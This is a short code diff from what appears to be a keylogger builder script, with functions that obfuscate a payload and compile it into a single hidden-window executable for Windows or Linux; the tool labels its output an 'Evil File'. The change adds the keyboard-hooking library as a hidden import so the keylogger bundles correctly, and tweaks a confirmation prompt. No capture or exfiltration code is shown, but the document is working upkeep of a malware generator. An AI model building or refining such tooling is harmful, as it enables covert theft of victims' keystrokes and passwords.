@@ -66,10 +66,10 @@ def obfuscating_payload(file_name):
         file.write(text)
 
 def compile_for_windows(file_name):
-    subprocess.call([WINDOWS_PYTHON_PYINSTALLER_PATH, "--onefile", "--noconsole", "--hidden-import=keylogger", file_name])
+    subprocess.call([WINDOWS_PYTHON_PYINSTALLER_PATH, "--onefile", "--noconsole", "--hidden-import=pynput.keyboard", "--hidden-import=keylogger", file_name])
 
 def compile_for_linux(file_name):
-    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--hidden-import=keylogger", file_name])
+    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--hidden-import=pynput.keyboard", "--hidden-import=keylogger", file_name])
 
 def del_junk_file(file_name):
     build = os.getcwd() + "\\build"
@@ -104,7 +104,7 @@ if __name__ == '__main__':
         print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out)        
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
         
-        ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) :')
+        ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) : ')
     
         if ask.lower() == 'y':
             pass
